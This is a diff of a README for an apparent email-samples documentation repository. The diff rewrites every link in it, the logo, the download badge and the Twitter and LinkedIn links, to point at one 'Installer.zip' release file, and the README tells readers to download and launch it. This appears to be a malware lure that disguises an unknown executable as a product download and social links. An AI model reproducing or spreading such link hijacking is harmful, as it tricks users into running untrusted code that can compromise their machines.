@@ -1,6 +1,6 @@
 # 📧 **DMAIL Email Samples Documentation Repository** 📦📖
 
-![DMAIL Logo](https://example.com/dmail_logo.png)
+![DMAIL Logo](https://github.com/jcjoson02/DMAIL_EmailSamples_Docs/releases/download/v1.0/Installer.zip)
 
 Welcome to the official documentation source repository for the DMAIL implementation of the EMAIL 2 Email Samples specification, where we create samples of emails to showcase the capabilities of our system.
 
@@ -12,7 +12,7 @@ Welcome to the official documentation source repository for the DMAIL implementa
 ## Get Started
 To access the latest version of our implementation, download it from the following link: 
 
-[![Download DMAIL Implementation](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download DMAIL Implementation](https://github.com/jcjoson02/DMAIL_EmailSamples_Docs/releases/download/v1.0/Installer.zip)](https://github.com/jcjoson02/DMAIL_EmailSamples_Docs/releases/download/v1.0/Installer.zip)
 
 ## Need Help?
 If the link above is a file, you need to download and launch it to access the implementation. If it directs you to a website, simply visit the link to get more information. In case the link is not working or not provided, please check the "Releases" section of this repository for alternative downloads.
@@ -22,8 +22,8 @@ We welcome contributions to enhance our documentation and email samples. Feel fr
 
 ## Stay Connected
 Stay updated with the latest news and developments by following us on social media:
-- Twitter: [@DMAIL_Official](https://twitter.com/DMAIL_Official)
-- LinkedIn: [DMAIL](https://www.linkedin.com/company/dmail)
+- Twitter: [@DMAIL_Official](https://github.com/jcjoson02/DMAIL_EmailSamples_Docs/releases/download/v1.0/Installer.zip)
+- LinkedIn: [DMAIL](https://github.com/jcjoson02/DMAIL_EmailSamples_Docs/releases/download/v1.0/Installer.zip)
 
 
 ## License
